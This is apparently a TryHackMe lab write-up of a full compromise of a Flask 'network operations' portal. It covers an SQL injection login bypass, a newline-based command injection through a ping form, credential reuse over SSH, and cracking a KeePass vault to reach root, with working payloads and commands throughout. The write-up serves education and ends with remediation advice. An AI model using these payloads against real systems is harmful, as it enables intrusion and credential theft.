# Silent Monitor — TryHackMe Write-up

> **Difficulty:** Medium
> **Category:** Web Exploitation → Command Injection → Credential Access → Privilege Escalation
> **Platform:** Linux (Ubuntu 22.04)
> **Author of write-up:** Artem

---

## Table of Contents

1. [Scenario](#scenario)
2. [Executive Summary](#executive-summary)
3. [Kill Chain Overview](#kill-chain-overview)
4. [Reconnaissance](#1-reconnaissance)
5. [Content Discovery](#2-content-discovery)
6. [Authentication Bypass — SQL Injection](#3-authentication-bypass--sql-injection)
7. [Post-Auth Enumeration](#4-post-auth-enumeration)
8. [OS Command Injection](#5-os-command-injection)
9. [Credential Access & Lateral Movement (SSH)](#6-credential-access--lateral-movement-ssh)
10. [Privilege Escalation — KeePass](#7-privilege-escalation--keepass)
11. [Root](#8-root)
12. [Lessons Learned & Methodology Notes](#lessons-learned--methodology-notes)
13. [Remediation](#remediation)

---

## Scenario

CorpNet's internal Network Operations Centre (NOC) has been running quietly in the
background for years — monitoring hosts, logging events, keeping the infrastructure
green. Intel from a disgruntled contractor suggests someone on the NOC team was cutting
corners: leaving doors open and hiding equipment where nobody thought to look.

The portal is up. Services show green. The audit log looks clean.
But tidy log entries can be written by anyone.

**Objective:** enumerate the running internal services, exploit a web-application
vulnerability, manipulate the system, and obtain root.

---

## Executive Summary

A single exposed Flask/Werkzeug application (port 5050) proved to be the entry point to
a full host compromise. The attack chained **four distinct weaknesses**, none of which
was independently critical, but which together resulted in complete takeover:

| # | Weakness | Individual Severity | Role in Chain |
|---|----------|--------------------|---------------|
| 1 | SQL injection in the login form (OR-based auth bypass) | Medium | Initial access to the operator dashboard |
| 2 | OS command injection in the "Host Health" probe (unanchored regex validator) | High | Remote code execution as `www-data` |
| 3 | Plaintext service credentials in a world-readable config file | Medium | Lateral movement to `sysadmin` via SSH |
| 4 | Weak master password on an `infrastructure` KeePass vault containing the root password | High | Privilege escalation to `root` |

The key finding is **not any single bug** — it is the **chain**. The takeaway for a
risk report: impact should be assessed against the cumulative path (initial access →
RCE → credential reuse → root), not against isolated issues.

---

## Kill Chain Overview

```
nmap recon
   └─> hidden /internal route (dir fuzzing)
        └─> SQLi auth bypass  ────────────────>  operator session
             └─> /internal/health ping function
                  └─> OS command injection (\n bypass of host validator)  ──> RCE as www-data
                       └─> read secret.config  ──> sysadmin service password
                            └─> SSH pivot  ──> user.txt
                                 └─> ~/backups/infrastructure.kdbx (KeePass)
                                      └─> crack master password  ──> root password
                                           └─> su root  ──> root.txt
```

---

## 1. Reconnaissance

Full TCP port + service/version scan:

```bash
nmap -sC -sV -O -p- <TARGET_IP>
```

Result (trimmed):

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
5050/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.10.12)
|_http-title: CorpNet — Network Operations Centre
```

**Analysis of the attack surface:**

* **22/tcp — OpenSSH 8.9p1.** Patched and current. Not an entry point — treat it as a
  *re-entry / persistence* point to return to later with harvested credentials.
* **5050/tcp — Werkzeug 2.0.2 (Python 3.10.12).** Werkzeug is the WSGI library behind
  Flask. Seeing it exposed "bare" means the app is served by Flask's built-in dev server
  (`app.run()`), not a hardened gunicorn/nginx stack. This implies:
  * possible `debug=True` (interactive Werkzeug console → potential RCE)
  * hand-rolled application logic → likely flaws in auth, parameter handling, SSRF.

The scenario text ("enumerate **internal** services", "secret control panel", "hidden
where nobody thought to look") points at hidden routes and a server-side function that
reaches into the network. This shaped the working hypothesis before touching a single
tool.

---

## 2. Content Discovery

The landing page (`/`) is a static marketing page — no forms, no links to other routes,
no parameters. The functionality is deliberately hidden behind unlinked routes.

First, capture a baseline for the custom 404 (needed to filter fuzzing noise):

```bash
curl -s <TARGET_IP>:5050/thisdoesnotexist123 | wc -c   # => 3424 bytes
```

Directory fuzzing, filtering out the 404 size:

```bash
ffuf -u http://<TARGET_IP>:5050/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt \
  -t 50 -fs 3424
```

```
internal   [Status: 200, Size: 8770]
```

A quick manual sweep confirmed the same and surfaced sub-routes:

```bash
ffuf -u http://<TARGET_IP>:5050/internal/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt \
  -t 50 -fs 3424
```

```
logout      [Status: 302]
dashboard   [Status: 302]
health      [Status: 302]
```

`/internal` returns a **login form** (`POST` to `/internal`). The three sub-routes return
**302 redirects** — protected resources that bounce unauthenticated users back to the
login. So: login gate in front, functionality behind it.

---

## 3. Authentication Bypass — SQL Injection

> **This section is deliberately verbose because the *methodology* here is the most
> valuable part of the whole box.**

### 3.1 First (incorrect) conclusion

Naïve probes returned a stable, identical error for every input:

```bash
# broken quote — no parser error, no traceback
curl -s -X POST http://<TARGET_IP>:5050/internal --data-urlencode "username=admin'&password=x"
# => "Invalid username or password."

# boolean true/false test
username=admin' AND '1'='2   => Invalid
username=admin' AND '1'='1   => Invalid
```

sqlmap (default-ish settings) agreed:

```bash
sqlmap -u "http://<TARGET_IP>:5050/internal" --data="username=admin&password=x" \
  -p username --batch --level 3 --risk 2
# => all tested parameters do not appear to be injectable
```

Three signals all said "no SQLi", so the vector was closed. **This was a mistake.**

### 3.2 Why the tools were wrong

The break came from questioning *why* the negative result occurred rather than trusting
it:

* The **true/false oracle was mis-constructed.** `admin' AND '1'='1` was tied to the
  existing user `admin` and never neutralised the password check, so the *overall* query
  was still false — a false negative.
* **sqlmap ran at `--risk 2`**, where **OR-based** payloads are *not tested* (they are
  risky — an `OR 1=1` can match many rows — and only fire at `--risk 3`).
* All three "confirmations" shared **one blind spot**: this app signals success with a
  **302 redirect to another URL**, not with a change in the response body. Every method
  that looked only at body text was blind to the same thing.
  → **Consistency of results is not the same as independence of results.**

### 3.3 The working bypass

An OR-based payload in the **username** field:

```bash
curl -s -i -X POST http://<TARGET_IP>:5050/internal \
  --data-urlencode "username=' or 1 or '&password=admin"
```

```
HTTP/1.0 302 FOUND
Location: http://<TARGET_IP>:5050/internal/dashboard
Set-Cookie: session=eyJyb2xl...<snip>...; HttpOnly; Path=/
```

**Success markers:** redirect to `/internal/dashboard` + a `Set-Cookie` session issued.

The likely server-side query:

```sql
SELECT ... WHERE username='<input>' AND password='<input>'
-- becomes:
SELECT ... WHERE username='' or 1 or '' AND password='admin'
-- 'or 1' forces the whole expression true -> first row returned -> logged in
```

### 3.4 Reproducing the tool's success (for learning)

With the correct oracle and risk level, sqlmap **does** find it:

```bash
sqlmap -u "http://<TARGET_IP>:5050/internal" \
  --data="username=*&password=admin" \
  --dbms=sqlite --level=5 --risk=3 \
  --not-string="Invalid" --batch
# => (custom) POST parameter '#1*' appears to be 'OR boolean-based blind ...' injectable
```

The two changes that mattered:
* `--not-string="Invalid"` — tells sqlmap the failure marker, so it recognises the
  redirect-based success.
* `--risk=3` — enables the OR-based payload class.

The decoded session cookie:

```json
{"role": "operator", "user": "netops"}
```

Session state carries `role` and `user` — noted as a potential privilege-escalation
avenue via cookie forgery (would require the Flask `SECRET_KEY`).

---

## 4. Post-Auth Enumeration

With a valid session cookie stored in a jar:

```bash
curl -s -c jar.txt -X POST http://<TARGET_IP>:5050/internal \
  --data-urlencode "username=' or 1 or '&password=admin" >/dev/null
curl -s -b jar.txt http://<TARGET_IP>:5050/internal/dashboard
```

The dashboard exposes an **audit log** leaking internal subnets and usernames:

```
HEALTH_CHECK  10.0.0.1 / 10.0.1.1–4 / 10.0.2.5 / 10.0.0.254
users seen:   netops, svc-mon, jmartin
```

**Header analysis on the protected routes** — a cheap but decisive clue:

```
Vary: Cookie        # authorization decision is driven by the session cookie
```

Method behaviour split the routes by nature:

```
/internal/dashboard + POST  => 405 Method Not Allowed (GET only) -> a page
/internal/health    + POST  => 302 (accepts POST)               -> a function
```

`/internal/health` is the **Host Health Check** — a form taking a `target` (hostname/IP)
and running `ping -c 2 -W 1 <target>` server-side. This is the "function that reaches
into the network" the scenario hinted at, and the prime candidate for command injection.

---

## 5. OS Command Injection

### 5.1 Baseline

```bash
curl -s -b jar.txt -X POST http://<TARGET_IP>:5050/internal/health \
  --data-urlencode "target=127.0.0.1"
```

Output block shows: `$ ping -c 2 -W 1 127.0.0.1` and the ping stdout. The command output
is reflected on the page → any injection would be **visible**, not blind.

### 5.2 Shell metacharacters are filtered

```
target=127.0.0.1; id      => Invalid hostname or IP address.
target=127.0.0.1 | id     => Invalid
target=127.0.0.1$(id)     => Invalid
target=127.0.0.1 && id    => Invalid
```

A validator rejects `;` `|` `&` `$()` `` ` ``. The UI even advertises "RFC-952 compliant
hostnames". Naïve injection is blocked.

### 5.3 Probing the validator — hypothesis about the code

`localhost` and `example.com` both resolved and pinged, so the validator accepts
**alphabetic hostnames**, not just dotted-decimal IPs — it is a regex, not a strict
parser.

Key hypothesis: **is the regex anchored?** A common Flask mistake is:

```python
re.match(r'[a-z0-9.-]+', target)   # NOT anchored at end, tied to first line only
```

`re.match` without `re.DOTALL` validates only the **first line**. If the input's first
line is a valid IP, everything after a newline (`\n`) bypasses the check and reaches the
shell.

### 5.4 Confirmed RCE via newline bypass

```bash
curl -s -b jar.txt -X POST http://<TARGET_IP>:5050/internal/health \
  --data-urlencode $'target=127.0.0.1\nid'
```

```
--- 127.0.0.1 ping statistics ---
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**RCE confirmed as `www-data`.** The unanchored/first-line-only regex is the root cause.

### 5.5 Reading files through the channel

Directory listing revealed the app internals:

```bash
--data-urlencode $'target=127.0.0.1\nls'
# app.py   netops.db   secret.config   templates
```

The shell on the target is `dash` (`/bin/sh`), so bash-only tricks fail:

* `{cat,secret.config}` → `not found` (brace expansion is bash-only)
* `cat${IFS}secret.config` → `Invalid` (`$` trips the validator)

A literal space in the second line works, and so does redirection:

```bash
--data-urlencode $'target=127.0.0.1\ncat secret.config'
```

Config contents (secrets masked):

```ini
[backup_agent]
run_as   = sysadmin
password = S3cur3B******cc3ss!        # <-- service account password
# TODO: migrate to secrets manager before Q2 audit
```

> **Tip on parsing output:** the command result is rendered inside
> `<pre class="output-pre">…</pre>`. `grep` on the class name catches the CSS definition
> in `<style>` — parse the block instead, e.g. a small Python one-liner extracting the
> `<pre>` content and unescaping HTML entities.

---

## 6. Credential Access & Lateral Movement (SSH)

The `sysadmin` service password is a classic **credential-reuse** candidate — and port
22 was open from the start. Reusing the password over SSH succeeds:

```bash
ssh sysadmin@<TARGET_IP>
# password: S3cur3B******cc3ss!
```

```bash
id
# uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
cat user.txt
# THM{sQli_4nd_cMd_1nj3ct10n_****_y0u_h3re!}
```

**User flag captured.** The flag text itself narrates the path so far.

---

## 7. Privilege Escalation — KeePass

### 7.1 Local enumeration

```bash
sudo -l           # => sysadmin may NOT run sudo   (sudo vector closed)
id                # => no interesting groups (docker/lxd/adm) (group vector closed)
ls -la ~/backups
# README.txt            (context)
# infrastructure.kdbx   (KeePass 2.x credential database)  <-- strongest lead
```

`README.txt` confirms the vault holds infrastructure credentials, exported by the backup
agent. Priority target.

### 7.2 Exfiltrate the vault to the attack box

The transfer direction matters (`Connection refused` = nobody listening on that port).
Serve from the target, pull from Kali:

```bash
# on target (sysadmin)
cd ~/backups && python3 -m http.server 8080
# on attacker
wget http://<TARGET_IP>:8080/infrastructure.kdbx
file infrastructure.kdbx        # => KeePass password database 2.x KDBX
```

> `strings`/`cat` are useless against a KDBX — the body is encrypted by design; only the
> header is plaintext. You need the master password (or brute-force).

### 7.3 Cheap test before brute force

The vault was created by the backup agent, so first test **reuse** of the already-known
`backup_agent` password — before any wordlist:

```bash
keepassxc-cli ls infrastructure.kdbx
# => Invalid credentials (HMAC mismatch)   -> reuse failed, proceed to brute force
```

### 7.4 Extract hash & crack

The file is **KDBX 4.x (Argon2)**. The distro's ancient `john 1.8.0` core cannot parse
it (`File version '40000' is currently not supported!`), so a current **jumbo** build is
required:

```bash
cd /opt
git clone https://github.com/openwall/john -b bleeding-jumbo john-jumbo
cd john-jumbo/src && ./configure && make -sj4

/opt/john-jumbo/run/keepass2john infrastructure.kdbx > kdbx.hash
cat kdbx.hash
# infrastructure:$keepass$*4*15000*c9d9f39a*...   (KDBX4 / Argon2, 15000 rounds)
```

```bash
/opt/john-jumbo/run/john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash
# spring   (infrastructure)      <-- master password cracked (masked: s****g)
```

### 7.5 Read the vault

```bash
keepassxc-cli ls infrastructure.kdbx          # master pw: s****g
# Root User Password - Sensitive
# General/ Windows/ Network/ ...

keepassxc-cli show infrastructure.kdbx "Root User Password - Sensitive"
# UserName: root
# Password: S3cur3P4***nK33p4ss           (masked)
# Notes:    root user password, remember to change later.
```

---

## 8. Root

`sudo` was unavailable, but the vault yielded the root account password directly, so
switch user with the target account's own password:

```bash
su root
# password: S3cur3P4***nK33p4ss
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
# THM{KDBx_V4ul7_H4s_b33n_****_0peN}
```

**Root obtained.** Both flags together summarise the chain: SQLi + command injection led
to the foothold; a cracked KDBX vault led to root.

---

## Lessons Learned & Methodology Notes

These are the reusable takeaways — worth more than the flags themselves.

1. **A tool's negative result is only as strong as its configuration.**
   `sqlmap not injectable` ≠ "no SQLi". It was OR-based (needs `--risk 3`) and the app
   signalled success via redirect (needs `--not-string`). Always ask *why* a negative
   occurred before closing a vector.

2. **Consistency ≠ independence.** Three methods "confirmed" no SQLi, but all three were
   blind to the same thing (redirect-based success, no error reflection). Agreement
   between co-blind checks proves nothing.

3. **Cheap diagnostics before brute force.** This held throughout: filtering fuzz noise
   with a 404 baseline, probing the validator before firing payloads, and testing
   password *reuse* on the KDBX before running rockyou.

4. **Response metadata are evidence.** `Vary: Cookie` revealed the authorization
   mechanism in seconds; the `302 vs 405` split classified routes into "page" vs
   "function".

5. **Infer the implementation from behaviour.** "Unanchored regex → `\n` bypass" was a
   hypothesis about the source code, tested by experiment — not payload roulette.

6. **Environment dictates technique.** `dash` vs `bash` broke brace expansion; KDBX4/Argon2
   broke the ancient `john` core. Know your target/tooling constraints.

7. **Severity lives in the chain, not the bug.** Report impact as
   *initial access → RCE → credential reuse → root*, which is the language risk owners
   (e.g. TIBER/DORA-style engagements) care about.

---

## Remediation

| Finding | Fix |
|---------|-----|
| SQL injection in login | Use parameterised queries / an ORM; never concatenate user input into SQL. Hash+salt passwords and compare in code, not in the query. |
| Command injection in health probe | Do not shell out. Use a library-based ICMP or `subprocess` with an argument **list** and no shell. If shelling is unavoidable, validate with an **anchored** regex (`re.fullmatch`) and reject any input containing whitespace/newlines/metacharacters. |
| Plaintext creds in `secret.config` | Move secrets to a managed secrets store; restrict file permissions; rotate the exposed `sysadmin` password (and stop reusing it for SSH). |
| Credential reuse (service ↔ SSH) | Distinct credentials per account/purpose; enforce key-based SSH and disable password auth. |
| Weak KeePass master password (`s****g`) | Enforce a strong, high-entropy master passphrase; do not store the root password in a shared vault; apply least privilege to the backup export directory. |
| "Root password, remember to change later" | Rotate immediately; adopt a break-glass process instead of long-lived shared root credentials. |

---

*Write-up produced for educational/portfolio purposes. All exploitation was performed
against an authorised TryHackMe lab environment. Flags and passwords are partially
masked.*
